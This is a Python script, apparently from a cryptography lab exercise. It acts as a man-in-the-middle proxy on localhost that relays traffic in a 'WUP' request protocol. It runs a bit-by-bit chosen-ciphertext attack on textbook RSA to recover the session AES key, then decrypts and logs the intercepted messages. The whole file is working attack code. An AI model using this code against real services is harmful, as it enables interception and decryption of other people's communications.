import base64
import socket
import AES
import RSA
import struct
import gmpy2
import threading
import logging

import utils

RSA_PUBLIC_KEY_DIR = '.\\data\\_RSA_Public_Key.txt'
DECODE_WUP_FAIL_MESSAGE = "FAILED_TO_DECODE"
HISTORY_MESSAGE_DIR = '.\\data\\History_Message.txt'
WUP_REQUEST_DIR = '.\\data\\WUP_Request.txt'
AES_WUP_REQUEST_DIR = '.\\data\\AES_Encrypted_WUP.txt'
BUFFER_SIZE = 1024
IP = (127, 0, 0, 1)
PORT = 8080

def bytes_to_line(in_x):
    return in_x+b'\n'

def add_to_file(filedir, content):
    with open(filedir, 'ab') as file:
        file.write(bytes_to_line(content))

def encode_attack_WUP(aes_key, aes_cipher):
    wup1 = base64.b64encode(aes_cipher.encode('utf-8'))
    ip_info = struct.pack('BBBBH', IP[0], IP[1], IP[2], IP[3], PORT)
    encoded_ip_info = base64.b64encode(ip_info)
    _ip_info = aes_key.encrypt(encoded_ip_info.decode('utf-8'))
    add_to_file(AES_WUP_REQUEST_DIR, wup1)
    add_to_file(AES_WUP_REQUEST_DIR, _ip_info)
    add_to_file(WUP_REQUEST_DIR, aes_cipher.encode('utf-8'))
    add_to_file(WUP_REQUEST_DIR, encoded_ip_info)
    return bytes_to_line(wup1), bytes_to_line(_ip_info)


def decode_WUP(message, aes_key):
    decrypt_message = aes_key.decrypt(message)
    try:
        _message = decrypt_message.decode('utf-8')
    except UnicodeDecodeError:
        return DECODE_WUP_FAIL_MESSAGE
    return _message


def crack(client_socket, wup1):
    print('CRACK_CLIENT::ATTACK START')
    logging.info('CRACK_CLIENT::ATTACK START')
    # decode WUP to get the RSA-encrypted AES Key
    C = base64.b64decode(wup1).decode('utf-8')
    # load RSA-public Key
    rsa_public_key = RSA.PublicKey.import_from(RSA_PUBLIC_KEY_DIR)
    known_aes = 0
    for i in range(127,-1,-1):
        print('CRACK_CLIENT::current i: {}, known aes: {}'.format(i, bin(known_aes)[2:]))
        fac = gmpy2.powmod(2, (i)*rsa_public_key.x, rsa_public_key.n)
        b_cipher = gmpy2.f_mod(fac*gmpy2.mpz(C), rsa_public_key.n)
        test_aes = (known_aes<<i) + (1<<127)
        test_aes_key = AES.AESKey(utils.int_to_aes_key(test_aes))
        attack_wup1, attack_wup2 = encode_attack_WUP(test_aes_key, str(b_cipher))
        client_socket.send(attack_wup1)
        print("CRACK_CLIENT::send attack_wup1 {}".format(attack_wup1))
        logging.info("CRACK_CLIENT::send attack_wup1 {}".format(attack_wup1))
        client_socket.send(attack_wup2)
        print("CRACK_CLIENT::send attack_wup2 {}".format(attack_wup2))
        logging.info("CRACK_CLIENT::send attack_wup2 {}".format(attack_wup2))
        # recv reaction
        buff = client_socket.recv(BUFFER_SIZE)
        recv = buff.decode('utf-8')
        message = decode_WUP(recv, test_aes_key)
        message = utils.unwrap_message(message)
        if message=='correct':
            known_aes = known_aes+(1<<(127-i))
        else:
            known_aes = known_aes
    print('CRACK_CLIENT::ATTACK FINISHED')
    logging.info('CRACK_CLIENT::ATTACK FINISHED, AES Key: {}'.format(known_aes))
    return known_aes


def display_recv(messages, aes_key_num):
    aes_key = AES.AESKey(utils.int_to_aes_key(aes_key_num))
    for message in messages:
        # print('++Symbol++')
        ip_info = message[:24]
        encoded_message = message[24:]
        _message = aes_key.decrypt(encoded_message)
        encrypted_ip_info = aes_key.decrypt(ip_info)
        packed_ip_info = base64.b64decode(encrypted_ip_info)
        _ip_info = struct.unpack('BBBBH', packed_ip_info)
        print("CRACK_CLIENT::[Eavesdropped message] IP: {}, Message: {}".format(_ip_info, _message))
        logging.info("CRACK_CLIENT::[Eavesdropped message] IP: {}, Message: {}".format(_ip_info, _message))
        add_to_file(HISTORY_MESSAGE_DIR, _message)


def eavesdrop_thread(proxy_client, send_client):
    cracked = False
    recv_record = []
    cracked_aes_key_num = 0
    with proxy_client.makefile('r') as s_file:
        while True:
            if proxy_client is not None:
                buff = s_file.readline().strip()
                wup1 = buff
                print("CRACK_CLIENT::eavesdrop wup1: {}".format(wup1))
                logging.info("CRACK_CLIENT::eavesdrop wup1: {}".format(wup1))
                send_client.send((buff+'\n').encode('utf-8'))

                buff = s_file.readline().strip()
                wup2 = buff
                print("CRACK_CLIENT::eavesdrop wup2: {}".format(wup2))
                logging.info("CRACK_CLIENT::eavesdrop wup2: {}".format(wup2))
                recv_record.append(wup2)
                send_client.send((buff+'\n').encode('utf-8'))

                # recv respond from the server
                buff = send_client.recv(BUFFER_SIZE)
                proxy_client.send(buff)
                if not cracked:
                    cracked_aes_key_num = crack(send_client, wup1)
                    display_recv(recv_record, cracked_aes_key_num)
                    cracked = True
                else:
                    display_recv([wup2], cracked_aes_key_num)


def eavesdrop_client_start():
    proxy_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_client.bind(('127.0.0.1', 8081))
    proxy_client.listen(1)
    send_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_client.connect(('127.0.0.1', 8080))
    # initialize log
    logging.basicConfig(filename='.\\log\\cracker.log', filemode='w', format='%(asctime)s %(name)s:%(levelname)s:%(message)s', datefmt='%d-%m-%Y %H:%M:%S', level=logging.DEBUG)
    while True:
        print('CRACKER::Waiting for connection...')
        connect, address = proxy_client.accept()
        print('CRACKER::Connected to {},{}.'.format(connect, address))
        logging.info('CRACKER::Connected to {},{}.'.format(connect, address))
        thread1 = threading.Thread(target=eavesdrop_thread, args=(connect, send_client))
        thread1.start()


def clear_file():
    with open(WUP_REQUEST_DIR, "w") as file:
        file.truncate(0)
    with open(AES_WUP_REQUEST_DIR, "w") as file:
        file.truncate(0)
    with open(HISTORY_MESSAGE_DIR, "w") as file:
        file.truncate(0)


def main():
    clear_file()
    eavesdrop_client_start()

if __name__=='__main__':
    main()
